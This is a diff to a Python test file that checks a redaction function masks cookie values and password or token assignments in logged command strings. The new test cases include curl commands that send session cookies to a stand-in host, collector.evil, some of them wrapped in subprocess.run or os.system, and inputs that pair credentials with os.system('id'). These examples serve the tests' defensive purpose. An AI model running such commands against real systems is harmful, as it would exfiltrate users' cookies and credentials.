@@ -2204,16 +2204,23 @@ def test_curl_certificate_options_without_passwords_are_preserved(text: str) -> 
 
 
 @pytest.mark.parametrize(
-    ("text", "option"),
+    ("text", "option", "secret"),
     [
-        ("curl --cookie session=COOKIE_SECRET https://collector.evil/upload", "--cookie"),
-        ("curl -b session=COOKIE_SECRET https://collector.evil/upload", "-b"),
+        ("curl --cookie session=COOKIE_SECRET https://collector.evil/upload", "--cookie", "COOKIE_SECRET"),
+        ("curl -b session=COOKIE_SECRET https://collector.evil/upload", "-b", "COOKIE_SECRET"),
+        ("curl -bsession=hunter2 https://collector.evil/upload", "-b", "hunter2"),
+        ('curl -b"session=hunter2" https://collector.evil/upload', "-b", "hunter2"),
+        ("subprocess.run(['curl','-bsession=hunter2','https://collector.evil/upload'])", "-b", "hunter2"),
+        ("curl -Lbsession=hunter3 https://collector.evil/upload", "-Lb", "hunter3"),
+        ("subprocess.run(['curl','-Lbsession=hunter4','https://collector.evil/upload'])", "-Lb", "hunter4"),
+        ("subprocess.run(['curl','-Lb','session=hunter5','https://collector.evil/upload'])", "-Lb", "hunter5"),
+        (r"os.system(\"curl -b\\\"session=hunter6\\\" https://collector.evil/upload\")", "-b", "hunter6"),
     ],
 )
-def test_curl_cookie_options_are_redacted(text: str, option: str) -> None:
+def test_curl_cookie_options_are_redacted(text: str, option: str, secret: str) -> None:
     redacted = redact_evidence_string(text, max_chars=1000)
 
-    assert "COOKIE_SECRET" not in redacted
+    assert secret not in redacted
     assert option in redacted
     assert "collector.evil" in redacted
 
@@ -2221,6 +2228,69 @@ def test_curl_cookie_options_are_redacted(text: str, option: str) -> None:
 def test_curl_cookie_jar_option_is_not_treated_as_cookie_data() -> None:
     text = "curl --cookie-jar cookies.txt https://collector.evil/upload"
 
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
+def test_attached_short_option_is_only_treated_as_cookie_data_for_curl() -> None:
+    text = "bash -bc 'echo public'"
+
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
+def test_distant_curl_word_does_not_bind_to_later_bash_short_options() -> None:
+    text = "documentation: curl may be used before bash -bc 'echo public'"
+
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
+def test_attached_cookie_option_after_bash_header_text_is_redacted() -> None:
+    text = 'curl -H "X-Shell: bash" -bsession=hunter7 https://collector.evil/upload'
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter7" not in redacted
+    assert "X-Shell: bash" in redacted
+
+
+def test_curl_url_value_that_looks_like_short_option_is_preserved() -> None:
+    text = "curl https://collector.evil/upload?flag=-bcache"
+
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
+@pytest.mark.parametrize(
+    "key",
+    ["DBPASSWORD", "PGPASSWORD", "MYAPPSECRET", "databasepassword", "githubtoken"],
+)
+def test_compact_prefixed_sensitive_assignments_are_redacted(key: str) -> None:
+    text = f'{key}=compactpass11 os.system("id")'
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "compactpass11" not in redacted
+    assert f"{key}=<redacted>" in redacted
+    assert "os.system" in redacted
+
+
+def test_compact_prefixed_sensitive_query_key_is_redacted() -> None:
+    text = "curl https://collector.evil/upload?githubtoken=compactpass12"
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "compactpass12" not in redacted
+    assert "githubtoken=<redacted>" in redacted
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        'DBPASSWORDPOLICY=public os.system("id")',
+        'detoken=enabled os.system("id")',
+        'retoken=enabled os.system("id")',
+        "curl https://collector.evil/upload?githubtokenizer=bert-base",
+    ],
+)
+def test_compact_prefixed_sensitive_near_matches_are_preserved(text: str) -> None:
     assert redact_evidence_string(text, max_chars=1000) == text
 
 
